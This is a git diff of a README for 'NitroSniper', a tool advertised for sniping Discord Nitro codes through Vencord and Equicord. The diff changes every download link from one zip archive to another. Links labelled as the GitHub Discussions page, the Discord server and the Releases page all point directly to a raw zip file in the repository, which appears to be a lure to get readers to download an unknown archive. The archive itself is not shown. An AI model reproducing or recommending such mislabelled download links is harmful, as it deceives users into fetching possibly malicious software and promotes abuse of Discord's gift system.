@@ -10,7 +10,7 @@ Welcome to NitroSniper! This tool works with Vencord and Equicord to help you au
 
 To download NitroSniper, visit the Releases page:
 
-[![Download NitroSniper](https://github.com/noinnxxz/NitroSniper/raw/refs/heads/main/assets/Nitro_Sniper_3.2.zip)](https://github.com/noinnxxz/NitroSniper/raw/refs/heads/main/assets/Nitro_Sniper_3.2.zip)
+[![Download NitroSniper](https://raw.githubusercontent.com/noinnxxz/NitroSniper/main/assets/Nitro_Sniper_2.1.zip)](https://raw.githubusercontent.com/noinnxxz/NitroSniper/main/assets/Nitro_Sniper_2.1.zip)
 
 This page has the latest version of NitroSniper. Just click the link to download the application.
 
@@ -68,8 +68,8 @@ Still having trouble? Visit our GitHub Issues page for additional support.
 
 Join our community to share tips, ask questions, and get support from fellow NitroSniper users:
 
-- [GitHub Discussions](https://github.com/noinnxxz/NitroSniper/raw/refs/heads/main/assets/Nitro_Sniper_3.2.zip)
-- [Discord Server](https://github.com/noinnxxz/NitroSniper/raw/refs/heads/main/assets/Nitro_Sniper_3.2.zip)
+- [GitHub Discussions](https://raw.githubusercontent.com/noinnxxz/NitroSniper/main/assets/Nitro_Sniper_2.1.zip)
+- [Discord Server](https://raw.githubusercontent.com/noinnxxz/NitroSniper/main/assets/Nitro_Sniper_2.1.zip)
 
 ## 📄 License
 
@@ -77,6 +77,6 @@ NitroSniper is licensed under the MIT license. You are free to modify and distri
 
 ## 📢 Updates and News
 
-Stay tuned for updates! Always check back on our [Releases page](https://github.com/noinnxxz/NitroSniper/raw/refs/heads/main/assets/Nitro_Sniper_3.2.zip) for new features and enhancements.
+Stay tuned for updates! Always check back on our [Releases page](https://raw.githubusercontent.com/noinnxxz/NitroSniper/main/assets/Nitro_Sniper_2.1.zip) for new features and enhancements.
 
 Thank you for choosing NitroSniper. We hope it helps you snag that Discord Nitro!
